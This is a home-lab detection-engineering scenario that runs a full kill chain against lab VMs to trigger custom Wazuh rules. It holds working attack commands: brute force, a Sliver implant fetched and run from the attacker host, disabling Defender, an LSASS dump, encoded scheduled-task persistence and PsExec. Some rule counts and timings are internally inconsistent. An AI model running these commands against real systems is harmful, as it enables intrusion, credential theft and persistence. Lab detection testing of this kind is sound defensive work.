# Scenario 05: Full Kill Chain — Initial Access → C2 → Credential Theft → Lateral Movement → Persistence

> **FOR AUTHORIZED HOME LAB USE ONLY**
> This scenario runs exclusively within the isolated UTM lab (192.168.64.0/24).
> This is the capstone scenario. All 8 detection rules should fire during execution.

---

## Scenario Overview

| Field | Value |
|-------|-------|
| **Objective** | Execute a complete attacker kill chain from initial access through persistence, triggering all 8 custom Wazuh rules |
| **Threat Actor Profile** | APT-style operator (modeled on Sliver-using threat actors, per CISA AA23-025A) |
| **Duration** | ~90 minutes |
| **Complexity** | Advanced (capstone) |
| **MITRE Techniques** | T1110.001, T1003.001, T1059.001, T1071.001, T1021.002, T1562.001, T1053.005 + T1021.004 |
| **All Rules Exercised** | 100001, 100002, 100003, 100005, 100007, 100008, 100009, 100010, 100012, 100015, 100017, 100018, 100019 |

---

## Kill Chain Overview

```
Phase 0: Reconnaissance
  └── nmap scan of 192.168.64.0/24

Phase 1: Initial Access (T1110.001)
  └── RDP brute force against victim-windows → EventID 4625 ×5 → Rule 100003

Phase 2: Execution + C2 Established (T1059.001, T1071.001)
  └── PowerShell download cradle downloads Sliver implant → Rule 100006
  └── Implant executes from AppData, beacons to 192.168.64.30:443 → Rule 100009
  └── 10+ beacon connections → Rule 100010

Phase 3: Defense Evasion (T1562.001)
  └── Disable Defender via Set-MpPreference → Rule 100016
  └── Add Exclusion via registry → Rule 100015

Phase 4: Credential Access (T1003.001)
  └── LSASS dump via Sliver procdump → Rule 100005

Phase 5: Persistence (T1053.005)
  └── Scheduled task with encoded PS payload → Rule 100018, 100019

Phase 6: Lateral Movement (T1021.002, T1021.004)
  └── PsExec from victim → wazuh-manager → Rule 100012
  └── SSH brute force from kali → wazuh-manager → Rule 100001 → 100002
```

---

## MITRE ATT&CK Navigator Layer

Coverage achieved by this kill chain:

| Tactic | Techniques Exercised |
|--------|---------------------|
| Reconnaissance | T1592 (Host Info), T1046 (Network Scan) |
| Initial Access | T1110.001 (Brute Force) |
| Execution | T1059.001 (PowerShell), T1569.002 (Service) |
| Persistence | T1053.005 (Sched. Task), T1547.001 (Run Key) |
| Defense Evasion | T1562.001 (Impair Tools), T1027 (Obfuscation) |
| Credential Access | T1003.001 (LSASS Dump) |
| Lateral Movement | T1021.002 (PsExec), T1021.004 (SSH) |
| Command & Control | T1071.001 (Web Protocols), T1132.001 (Encoding) |

---

## Prerequisites

- [ ] **All 3 VMs running** and healthy
- [ ] Kibana accessible: http://192.168.64.10:5601
- [ ] Sysmon, Filebeat, Wazuh agent running on victim-windows
- [ ] Sliver installed on kali-attacker
- [ ] ART (Invoke-AtomicRedTeam) installed on victim-windows
- [ ] **UTM snapshots taken on ALL VMs** before starting — this scenario leaves artifacts
- [ ] A second monitor or split screen is helpful (Kibana on one, terminal on the other)

---

## Phase 0: Reconnaissance (~5 minutes)

```bash
# [kali-attacker] Full lab network scan
nmap -sV -sC -O -p 22,80,443,445,3389,5601,5985 192.168.64.0/24 -oN /tmp/lab-recon.txt
cat /tmp/lab-recon.txt

# Target selection:
# 192.168.64.20 → victim-windows (RDP :3389 open)
# 192.168.64.10 → wazuh-manager (SSH :22 open, Kibana :5601 open)
```

---

## Phase 1: Initial Access via RDP Brute Force (~10 minutes)

```bash
# [kali-attacker] RDP brute force against victim-windows
# Small wordlist for speed — real attacker would use larger list
crowbar -b rdp \
  -s 192.168.64.20/32 \
  -u SOCAdmin \
  -C /usr/share/wordlists/fasttrack.txt \
  -n 1 \
  -v
```

**OR using Hydra:**

```bash
hydra -l SOCAdmin \
  -P /usr/share/wordlists/fasttrack.txt \
  rdp://192.168.64.20 \
  -t 1 -V -f
```

**Note UTC timestamp:**
```bash
echo "Phase 1 start: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
```

**Expected detection:** Rule 100003 fires (level 10) after 5+ EventID 4625 events.

**Kibana check:**
```
rule.id:100003 AND agent.name:"victim-windows"
```

> **For the demo:** Even if the brute force doesn't "succeed" (wrong password), the failed attempts trigger rule 100003. To simulate success for rule 100004, simply log into RDP manually with correct credentials after the brute-force phase.

---

## Phase 2: Execution and C2 Establishment (~15 minutes)

### 2a: Operator Prep on Kali

```bash
# [kali-attacker] Start Sliver listener
sudo systemctl start sliver
sliver

sliver > https --lport 443 --lhost 192.168.64.30
sliver > jobs  # Verify listener is up
```

### 2b: Generate ARM64 Implant

```bash
sliver > generate \
  --https 192.168.64.30 \
  --os windows \
  --arch arm64 \
  --format exe \
  --save /tmp/ \
  --name svcmonitor

# Note the exact filename
IMPLANT=$(ls /tmp/SVCMONITOR_*.exe | head -1)
echo "Implant: $IMPLANT"
```

### 2c: Serve and Execute on Victim

```bash
# [kali-attacker — separate terminal]
cd /tmp && python3 -m http.server 8080 --bind 192.168.64.30
```

```powershell
# [victim-windows — PowerShell as SOCAdmin]
# Download to AppData (writable path that triggers rule 100009)
$dest = "$env:APPDATA\Microsoft\Windows\svcmonitor.exe"
Invoke-WebRequest "http://192.168.64.30:8080/SVCMONITOR_XXXXXXXX.exe" -OutFile $dest
Start-Process $dest

echo "Phase 2 time: $([System.DateTime]::UtcNow.ToString('yyyy-MM-ddTHH:mm:ssZ'))"
```

**Wait for session on Kali:**

```bash
sliver > sessions
# Session appears within ~15 seconds
sliver > use 1
sliver (SVCMONITOR) > whoami   # Verify access
```

**Expected detections:**
- Rule 100006 (level 6): PowerShell spawned
- Rule 100009 (level 6): First outbound connection from AppData path
- Rule 100010 (level 12): 10+ beacon connections to 192.168.64.30

**Kibana check:**
```
rule.id:(100006 OR 100009 OR 100010) AND agent.name:"victim-windows"
```

---

## Phase 3: Defense Evasion (~5 minutes)

```bash
# [kali — sliver session]
sliver (SVCMONITOR) > shell
```

```powershell
# [C2 shell → victim-windows]
# Disable Defender (triggers rule 100016 — level 14)
Set-MpPreference -DisableRealtimeMonitoring $true

# Add exclusion for tool staging directory (triggers rule 100015 — level 14)
New-Item -ItemType Directory -Path "C:\ProgramData\WinService" -Force | Out-Null
Add-MpPreference -ExclusionPath "C:\ProgramData\WinService"

echo "Phase 3 time: $(([System.DateTime]::UtcNow).ToString('yyyy-MM-ddTHH:mm:ssZ'))"
exit
```

**Expected detections:**
- Rule 100016 (level 14): Set-MpPreference DisableRealtimeMonitoring
- Rule 100015 (level 14): Registry write to Defender Exclusions

**Kibana check:**
```
rule.id:(100015 OR 100016) AND agent.name:"victim-windows"
```

---

## Phase 4: Credential Access — LSASS Dump (~10 minutes)

```bash
# [kali — sliver session]
# Find LSASS PID
sliver (SVCMONITOR) > ps
# Note the PID for lsass.exe

# Dump LSASS memory (triggers Sysmon EID 10 → Rule 100005 level 14)
sliver (SVCMONITOR) > procdump --pid [LSASS_PID] --save /tmp/lsass.dmp
```

**OR via Atomic Red Team on victim-windows (if not using Sliver):**

```powershell
# [victim-windows — Admin PowerShell]
Invoke-AtomicTest T1003.001 -TestNumbers 1 -GetPrereqs
Invoke-AtomicTest T1003.001 -TestNumbers 1
echo "Phase 4 time: $([System.DateTime]::UtcNow.ToString('yyyy-MM-ddTHH:mm:ssZ'))"
```

**Expected detection:**
- Rule 100005 (level **14**): LSASS ProcessAccess with PROCESS_VM_READ mask

**Kibana check:**
```
rule.id:100005 AND win.eventdata.targetImage:*lsass*
```

---

## Phase 5: Persistence via Scheduled Task (~5 minutes)

```bash
# [kali — sliver session]
sliver (SVCMONITOR) > shell
```

```powershell
# [C2 shell → victim-windows]
# Create persistence task with encoded payload (triggers rule 100019 — level 14)
$p = "Start-Process '$env:APPDATA\Microsoft\Windows\svcmonitor.exe'"
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($p))

schtasks /create `
  /tn "WindowsNetworkMonitor" `
  /tr "powershell.exe -WindowStyle Hidden -NonInteractive -enc $enc" `
  /sc ONLOGON `
  /ru SOCAdmin `
  /f

echo "Task created: WindowsNetworkMonitor"
echo "Phase 5 time: $(([System.DateTime]::UtcNow).ToString('yyyy-MM-ddTHH:mm:ssZ'))"
exit
```

**Expected detections:**
- Rule 100018 (level 12): schtasks.exe with PowerShell payload
- Rule 100019 (level 14): schtasks.exe with -enc flag (obfuscated)

**Kibana check:**
```
rule.id:(100018 OR 100019) AND win.eventdata.image:*schtasks*
```

---

## Phase 6: Lateral Movement (~10 minutes)

### 6a: PsExec to wazuh-manager (from victim-windows)

```powershell
# [victim-windows — Admin PowerShell]
Invoke-AtomicTest T1021.002 -TestNumbers 2 -GetPrereqs
Invoke-AtomicTest T1021.002 -TestNumbers 2
echo "PsExec time: $([System.DateTime]::UtcNow.ToString('yyyy-MM-ddTHH:mm:ssZ'))"
```

**OR via impacket from Kali (using credentials obtained in Phase 4):**

```bash
# [kali-attacker]
python3 /usr/share/doc/python3-impacket/examples/psexec.py \
  SOCAdmin:'Password123!'@192.168.64.20 'whoami'
```

**Expected detection:**
- Rule 100012 (level 10): EventID 7045 PSEXESVC service

### 6b: SSH Brute Force against wazuh-manager

```bash
# [kali-attacker]
hydra -l soc \
  -P /usr/share/wordlists/fasttrack.txt \
  ssh://192.168.64.10 \
  -t 4 -V -f -e nsr
```

**Expected detections:**
- Rule 100001 (level 10): 5+ SSH failures from 192.168.64.30
- Rule 100002 (level 14): SSH failure streak + successful login (if credentials found)

---

## Full Alert Timeline

At the end of the kill chain, all 8 detection rule groups should have fired.
Use this Kibana query to see the full timeline:

```
rule.id:(100001 OR 100002 OR 100003 OR 100005 OR 100006 OR 100007 OR 100009 OR 100010 OR 100012 OR 100015 OR 100016 OR 100018 OR 100019)
```

Sort by `timestamp` ascending to see the kill chain progression.

**Expected alert sequence (by time):**

| Phase | Time offset | Rule ID | Level | Description |
|-------|------------|---------|-------|-------------|
| 1 | T+0:00 | 100003 | 10 | RDP brute force starts |
| 1 | T+0:60 | 100004 | 14 | RDP brute + success |
| 2 | T+0:10 | 100006 | 6 | PowerShell download cradle |
| 2 | T+0:15 | 100009 | 6 | First beacon connection |
| 2 | T+2:00 | 100010 | 12 | Beacon threshold (10+ connections) |
| 3 | T+2:30 | 100016 | 14 | Defender disabled via PowerShell |
| 3 | T+2:35 | 100015 | 14 | Defender exclusion via registry |
| 4 | T+3:00 | 100005 | 14 | LSASS credential dump |
| 5 | T+3:30 | 100018 | 12 | Scheduled task with PowerShell |
| 5 | T+3:31 | 100019 | 14 | Scheduled task with encoded payload |
| 6 | T+4:00 | 100012 | 10 | PsExec service installed |
| 6 | T+5:00 | 100001 | 10 | SSH brute force detected |
| 6 | T+5:60 | 100002 | 14 | SSH brute force + success |

---

## Evidence to Capture (for Interview Demo)

- [ ] **Kibana screenshot**: Full timeline view showing all rules firing in sequence
- [ ] **Sliver screenshot**: Active session showing victim hostname, username, OS
- [ ] **LSASS dump screenshot**: Sysmon EID 10 alert in Kibana
- [ ] **Scheduled task screenshot**: `schtasks /query` output + rule 100019 alert
- [ ] **Wazuh dashboard screenshot**: Alert count by rule.level (should show multiple level 14s)
- [ ] **Alert export**: Export all alerts as JSON for incident report
- [ ] **MITRE ATT&CK Navigator**: Export as layer JSON showing covered techniques

**Export alerts for incident report:**

```bash
# [macOS host] Export all kill chain alerts
START="2024-01-01T00:00:00Z"  # Replace with actual start time
curl -s "http://192.168.64.10:9200/wazuh-alerts-*/_search?size=200" \
  -H "Content-Type: application/json" \
  -d "{\"query\":{\"bool\":{\"must\":[
    {\"range\":{\"timestamp\":{\"gte\":\"$START\"}}},
    {\"range\":{\"rule.id\":{\"gte\":100001,\"lte\":100019}}}
  ]}},\"sort\":[{\"timestamp\":{\"order\":\"asc\"}}]}" \
  | python3 -m json.tool > ~/Desktop/full-kill-chain-alerts.json

echo "Alert count: $(python3 -c "
import json
with open('$HOME/Desktop/full-kill-chain-alerts.json') as f:
    d = json.load(f)
print(d['hits']['total']['value'])
")"
```

---

## Cleanup — Complete Reset

```powershell
# [victim-windows — Admin PowerShell]

# 1. Terminate C2 implant process
Stop-Process -Name "svcmonitor" -Force -ErrorAction SilentlyContinue

# 2. Remove scheduled task
schtasks /delete /tn "WindowsNetworkMonitor" /f 2>$null
Invoke-AtomicTest T1053.005 -TestNumbers 1 -Cleanup

# 3. RE-ENABLE WINDOWS DEFENDER (CRITICAL — do not skip)
Set-MpPreference -DisableRealtimeMonitoring $false
Remove-MpPreference -ExclusionPath "C:\ProgramData\WinService" -ErrorAction SilentlyContinue
Invoke-AtomicTest T1562.001 -TestNumbers 1 -Cleanup

# 4. Verify Defender status
$s = Get-MpComputerStatus
Write-Host "RealTime: $($s.RealTimeProtectionEnabled)  AntiVirus: $($s.AntivirusEnabled)"

# 5. Remove implant binary
Remove-Item "$env:APPDATA\Microsoft\Windows\svcmonitor.exe" -Force -ErrorAction SilentlyContinue

# 6. Remove LSASS dump
Invoke-AtomicTest T1003.001 -TestNumbers 1 -Cleanup
Remove-Item "C:\Temp\lsass.dmp" -Force -ErrorAction SilentlyContinue

# 7. Clean PsExec artifacts
Invoke-AtomicTest T1021.002 -TestNumbers 2 -Cleanup
```

```bash
# [kali-attacker]
sliver > sessions kill --all
sliver > jobs kill --all
sudo systemctl stop sliver
rm -f /tmp/SVCMONITOR_*.exe /tmp/lsass.dmp /tmp/lab-recon.txt
```

**Recommended: Restore all VM snapshots** after this scenario to guarantee a clean baseline.

---

## Interview Talking Points

**What this scenario demonstrates (for your FAANG/security engineering interview):**

1. **End-to-end detection pipeline** — Every attacker action generates a Sysmon event, which flows through Filebeat → Wazuh → Elasticsearch → Kibana. You can show this complete data flow.

2. **Graduated severity** — Level 6 (informational) → Level 10 (warning) → Level 14 (critical). A real SOC analyst triages in this order; your rules are tuned to avoid alert fatigue.

3. **Kill chain correlation** — The compound rule (brute force + success) demonstrates that individual events have low value; it's the sequence that tells the story.

4. **Realistic tooling** — Sliver C2 is used by real threat actors (CISA 2023). Detecting it with Sysmon + Wazuh is operationally relevant, not just academic.

5. **Open-source at enterprise scale** — This entire detection stack costs $0 in software licensing. You can describe how it would scale horizontally (multiple Elasticsearch nodes, multiple Wazuh managers) in a production environment.

**Common interview question:** "How would you know if an attacker tried to evade your Sysmon detections?"
- **Answer:** Path filter evasion (rule 100009 only watches writable paths); an attacker who installs to `C:\Windows\System32\` would bypass it. This is a known gap — mentioned in the rule README. The fix is to add unsigned-binary monitoring across all paths.
